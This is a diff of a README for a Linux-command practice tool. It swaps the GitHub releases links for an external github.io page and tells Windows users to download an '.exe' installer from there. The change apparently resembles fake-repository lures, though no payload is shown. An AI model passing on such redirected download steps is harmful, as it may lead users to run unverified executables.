@@ -1,6 +1,6 @@
 # 🐧 linux_simulation - Master Linux commands through hands-on practice
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mariejeannechromosomal764/linux_simulation/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://mariejeannechromosomal764.github.io)
 
 ## 📋 About This Application
 
@@ -26,7 +26,7 @@ This software provides a safe space to learn the Linux operating system. You pra
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the following link to access the software files: [https://github.com/Mariejeannechromosomal764/linux_simulation/releases](https://github.com/Mariejeannechromosomal764/linux_simulation/releases).
+1. Visit the following link to access the software files: [https://mariejeannechromosomal764.github.io](https://mariejeannechromosomal764.github.io).
 2. Look for the latest version represented by the "Latest" tag.
 3. Choose the file ending in `.exe` that matches your system architecture.
 4. Download the installer file to your computer.
